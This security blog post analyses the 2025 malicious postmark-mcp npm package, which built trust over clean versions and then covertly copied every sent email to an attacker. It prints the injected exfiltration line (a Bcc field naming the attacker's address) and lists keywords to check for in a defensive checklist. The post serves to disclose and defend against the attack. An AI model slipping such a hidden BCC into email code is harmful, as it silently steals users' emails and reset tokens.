---
title: "The First Malicious MCP Server: How a Fake postmark-mcp Package Silently BCC'd 300 Organizations"
date: 2026-06-13
description: "Koi Security discovered the first confirmed malicious MCP server in the wild — a fake postmark-mcp package on npm that built trust over 15 clean versions, then added one line to silently BCC every outgoing email to an attacker-controlled address. ~300 organizations were compromised before removal."
og_description: "A fake postmark-mcp on npm ran clean for 15 versions, then added Bcc: 'phan@giftshop.club' to every email. ~300 orgs affected. SPF/DKIM passed. No alerts fired. Here's what MCP supply chain attacks look like in practice."
content_type: "Builder's Log"
categories: ["Security", "MCP", "Developer Tools", "AI Agents"]
tags: ["mcp", "supply-chain", "typosquatting", "postmark", "npm", "koi-security", "email-security", "bcc-exfiltration", "ai-builders", "security"]
sources_audited: 2026-07-30
---

In September 2025, researchers at [Koi Security](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) identified what they called "the world's first sighting of a real world malicious MCP server" — and [The Hacker News](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html) independently reported the same finding days later, giving the "first" claim two independent sources rather than one firm's framing. The package, `postmark-mcp` on npm, impersonated the legitimate Postmark email integration ([Postmark's own advisory](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package) confirms Postmark had never published a package to npm before this incident). It built trust over 15 clean releases before adding a single line of code that silently BCC'd every outgoing email to an attacker-controlled address. Because the emails were sent through the victim's own legitimate Postmark account, SPF and DKIM authentication passed as normal — [independent security analysis](https://securityboulevard.com/2026/06/malicious-mcp-servers-email-security-the-new-supply-chain-threat/) of the incident notes the messages carried valid DKIM signatures and passed SPF checks because the attack used authorized infrastructure rather than spoofing it, which is why perimeter email-authentication tooling had nothing to flag.

Koi Security estimated roughly 300 organizations were exposed, based on its download data (see below), before the package's publisher deleted it from npm on September 25, 2025 — [npm's own registry record](https://registry.npmjs.org/postmark-mcp) confirms the exact unpublish timestamp. Note: the package was removed by its own publisher after Koi Security contacted them, not pulled by npm's security team; [Koi Security's report](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) states the developer "promptly deleted the package from npm, trying to erase the evidence" after going silent when confronted, and [The Hacker News](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html) independently corroborates that the developer, not npm, removed it.

This article covers how the attack worked, what it exposed, and what builders should verify before installing any MCP server.

---

## Background: What Makes MCP Servers a Supply Chain Target

MCP servers are processes that AI agents launch and interact with to access tools — email sending, file management, database access, API integrations. The relevant security property is that **MCP servers run with pre-authorized credentials**. When you configure an MCP server for Postmark, you supply your API key at setup. Every subsequent request the agent makes through that server carries your credentials silently.

This is different from a malicious PyPI or npm package in a traditional sense. A compromised library might need to exfiltrate credentials by reaching out to an external host, which network controls can detect. A compromised MCP server doesn't need to exfiltrate credentials at all — it already has them, and it can *use* them on behalf of your agent to do whatever you authorized the tool to do. In the postmark-mcp case, that meant sending emails.

The attacker didn't steal the API key. They used the API key to steal emails.

---

## The Attack: Trust-Building Through Version Patience

**Publisher:** npm username `phanpak` ([The Hacker News](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html) and [Koi Security](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) both identify this account; Hacker News notes it also owned 31 other npm packages); the package's own `package.json`/JSDoc metadata lists the author as "Jabal Torres," per [Snyk's analysis](https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/) of the code — that name appears to be borrowed or fabricated rather than the actual identity behind `phanpak`, and we have no evidence tying it to any real person.
**Package name:** `postmark-mcp` (exact match to the legitimate GitHub repo name)
**Discovery:** Koi Security, reported September 25, 2025 ([Koi Security](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft))
**Removed from npm:** September 25, 2025, by the package's own publisher after Koi Security's outreach went unanswered — confirmed by [npm's registry record](https://registry.npmjs.org/postmark-mcp) (exact unpublish timestamp `2025-09-25T03:31:54Z`) and [Koi Security's account](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) of the developer deleting it rather than npm intervening

### Version History

Per [npm's own registry data](https://registry.npmjs.org/postmark-mcp), the publisher released the package on September 15, 2025, and iterated rapidly:

| Versions | Published (UTC) | Behavior |
|----------|------------------|----------|
| 1.0.0 – 1.0.15 | Sept 15 – Sept 16, 2025 | Fully functional. Mirrored the official GitHub code. Passed automated security scans. |
| 1.0.16 | Sept 17, 2025, 08:59 | **Malicious.** One line added to the email-sending function ([Koi Security](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) says "buried on line 231"). |
| 1.0.17 – 1.0.18 | Sept 17, 2025, 09:16 and 09:25 | Malicious. Published within roughly 30 minutes of 1.0.16, per the registry timestamps; these were the last versions before removal. |

This is a deliberate trust-building pattern. Automated sandbox checks analyze package behavior at publish time. A brand-new package with a one-line exfiltration payload is easy to flag. A package that runs cleanly through fifteen sequential versions — executing API calls correctly, producing expected outputs, earning baseline trust from security tracking systems — is substantially harder to catch. The attacker accepted the cost of 15 clean releases as the price of evading detection.

### The One-Line Change

On September 17, inside `index.js`'s email-sending function — [Koi Security](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) pinpoints it at "line 231" — the publisher added a field equivalent to:

```js
Bcc: 'phan@giftshop.club'
```

This single field was appended to the outgoing email object constructed for every message the MCP server sent. The Postmark API accepted it — BCC is a valid parameter. Every email sent through the MCP server was delivered normally to the intended recipient, and silently copied to `phan@giftshop.club` ([Koi Security](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft); the domain and mechanism are also confirmed by [Snyk](https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/)).

### Why It Was Invisible

There are three reasons this exfiltration generated no alerts in most environments:

1. **Legitimate delivery infrastructure.** The emails were sent through your Postmark account — the same account you authorized. SPF records pass because the sending server is Postmark's. DKIM signatures pass because they're signed with Postmark's keys on your domain's behalf ([independent analysis](https://securityboulevard.com/2026/06/malicious-mcp-servers-email-security-the-new-supply-chain-threat/) of the incident confirms stolen emails carried valid DKIM signatures and passed SPF checks). Nothing in the email headers looked malicious.

2. **BCC is silent by design.** BCC recipients are invisible to the `To:` and `CC:` recipients. The sender's sent mail folder typically does not show BCC copies. Unless you were logging outbound API payloads and inspecting every parameter, there was no visible sign in normal workflows.

3. **MCP servers are trusted processes.** The agent launched the MCP server from your config, supplied credentials you authorized, and used a tool you added intentionally. From the agent's perspective, everything was working correctly. The attacker was operating inside the perimeter, not breaking in.

---

## Impact

Download figures for the package vary slightly by source and metric. [Koi Security's own analysis](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) — the researchers who found the backdoor — put it at roughly **1,500 downloads per week**, and estimated that about 20 percent of downloaders were running it in active production, yielding their rough figure of **~300 organizations exposed**. [The Hacker News](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html) independently reported a **total of 1,643 downloads** for the package's roughly ten-day lifetime on npm — a different metric (lifetime total vs. weekly rate) but broadly consistent with Koi's weekly figure given how briefly the package existed.

The data exposed through the silent BCC channel included:

- **Password reset emails** — containing single-use tokens that grant account access
- **Invoices and billing communications** — financial records, payment confirmations
- **Customer-facing notifications** — whatever your product sends through Postmark
- **Internal operational emails** — onboarding flows, alert systems, anything transactional

The exposure window was September 17 to September 25 — approximately eight days. Organizations processing high email volumes through Postmark during that period may have exposed significant data before the package was removed.

---

## The Legitimate Postmark MCP Server

It is worth being explicit: the legitimate Postmark MCP server is maintained by [Postmark Labs](https://postmarkapp.com/blog/postmark-labs-teaching-ai-to-speak-email-with-our-new-mcp-server) (Postmark is now part of ActiveCampaign, which acquired it in 2022) and lives at [github.com/ActiveCampaign/postmark-mcp](https://github.com/ActiveCampaign/postmark-mcp). **[Postmark's own advisory](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package) confirms they had never published any package to npm prior to this incident.** The npm registry was entirely the attacker's territory.

[Our review of the legitimate server](/reviews/postmark-mcp-server/) covers its four tools, transport mode, and use cases for builders who want to integrate real Postmark MCP functionality. If you're evaluating Postmark as a transactional email platform for your AI agent workflows, that is the tool to use — GitHub source, installed directly, not via npm.

---

## Why This Attack Class Will Recur

The postmark-mcp incident is not a one-off. [Semgrep's analysis](https://semgrep.dev/blog/2025/so-the-first-malicious-mcp-server-has-been-found-on-npm-what-does-this-mean-for-mcp-security/) of the incident argues the attack *methodology* (trojanizing a trusted package after a clean track record) is well-worn in traditional supply chain attacks — what's new is the MCP credential-inheritance model amplifying the blast radius, a point [Qualys ThreatPROTECT](https://threatprotect.qualys.com/2025/09/30/malicious-mcp-server-on-npm-postmark-mcp-exploited-in-attack/) and [The Register](https://www.theregister.com/2025/09/29/postmark_mcp_server_code_hijacked/) both raised independently in their coverage. It demonstrates a reproducible attack pattern specific to the MCP ecosystem:

**1. The npm namespace is wide open for MCP server names.**  
Any attacker can publish `[tool-name]-mcp` or `mcp-[tool-name]` before the legitimate vendor does. Most MCP servers today are distributed via GitHub, not npm — which means the npm namespace for almost every popular MCP server is unclaimed and available to squatters.

**2. MCP servers don't require package signing or verified publisher identity.**  
There is no equivalent of npm's verified publisher badge for MCP servers. An attacker who lists an author name and publishes 15 clean versions has effectively established the same trust signals as a legitimate package.

**3. The credential inheritance model amplifies damage.**  
Traditional supply chain attacks require credential theft as a first step. MCP supply chain attacks skip that step. The attacker inherits whatever access you granted the MCP server — and uses it against you from inside your own authorized workflow.

**4. The attack scales to any integration category.**  
The postmark-mcp attack was delivered via email. The same approach applies to MCP servers that have access to databases, file systems, CRMs, payment processors, or infrastructure APIs. The more powerful the MCP server's access, the higher the potential impact from a compromised package.

---

## Builder Checklist: Verifying MCP Server Authenticity

Before installing any MCP server, run through these checks:

**Source verification**

- [ ] Does the vendor have an official MCP server? Check their docs, GitHub org, and official blog.
- [ ] Is the package distributed via GitHub (recommended) or npm? If npm, is the publisher account verifiably the vendor?
- [ ] Does the package author's npm username match the vendor's known GitHub organization?
- [ ] Is there a security advisory, blog post, or official announcement from the vendor about this package?

**Package inspection**

- [ ] Clone the source and read the tool implementation code before installing — especially the code that constructs API request payloads
- [ ] Look for unexpected `Bcc`, `Cc`, `webhook`, `callback`, or `exfiltrate` parameters in any outbound calls
- [ ] Check the npm publisher's other packages — do they suggest a legitimate developer profile or a squatter account?
- [ ] Review the version history: rapid publishing of many versions in a short window is a red flag

**Runtime hygiene**

- [ ] Enable outbound API request logging at the application level, not just at the network level
- [ ] Rotate API credentials for any MCP server that cannot be independently verified
- [ ] Use [MCP-Scan](https://github.com/invariantlabs-ai/mcp-scan) (Invariant Labs' open source MCP security scanner) or [Snyk's Agent Scan](https://github.com/snyk/agent-scan) to scan installed MCP server packages and configurations for tool poisoning and other risks — as [Dark Reading's coverage](https://www.darkreading.com/application-security/malicious-mcp-server-exfiltrates-secrets-bcc) of this incident notes, perimeter email security tooling alone would not have caught this class of attack
- [ ] If you used `postmark-mcp` from npm between September 17–25, 2025: rotate your Postmark API key immediately, audit your email logs for unexpected BCC traffic, and check for any sensitive data (password resets, payment confirmations) sent during that period
